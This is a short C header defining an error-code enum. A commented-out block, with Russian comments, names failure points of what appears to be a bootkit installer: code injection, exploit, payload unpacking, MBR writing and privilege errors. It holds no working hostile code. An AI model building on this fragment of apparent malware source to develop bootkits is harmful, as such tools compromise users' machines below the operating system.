#ifndef __ERRORS_H_
#define __ERRORS_H_

typedef enum ERROR_CODE
{
    ERR_NONE,
//	ERR_NOT_FOUND,
	/*
    ERROR_NO_MEMORY,                // Не хватает памяти.
    ERROR_HDD,
    ERROR_INJECT,
    ERROR_CRT60,
    ERROR_EXPLOIT,
    ERROR_KERNEL_INFO,
    ERROR_PAYLOAD_UNPACK,
    ERROR_PAYLOAD_CRC,
    ERROR_LOADLIBRARY,
    ERROR_BK_UNKNOWN,               // Неизвестная ошибка.
    ERROR_BK_IO,                    // Ошибка ввода/вывода.
    ERROR_UNSUPPORTED_SECTOR_SIZE,  // Не поддерживаемый размер сектора. 
    ERROR_BK_MBR,                   // Ошибка связанныя с некорректостью или отсутствием нужного MBR.
    ERROR_BK_NO_SPACE,              // Не достаточно места для сохранения тела буткита.
    ERROR_BK_BOOT_DISK_NOT_FOUND,   // Не удалось найти загрузочный диск.
    ERROR_BK_ALREADY_INSTALLED,
    ERROR_WOW64EXT,
    ERROR_PRIVILEGES,
	*/
    ERR_UNKNOWN
};

#endif // __ERRORS_H_
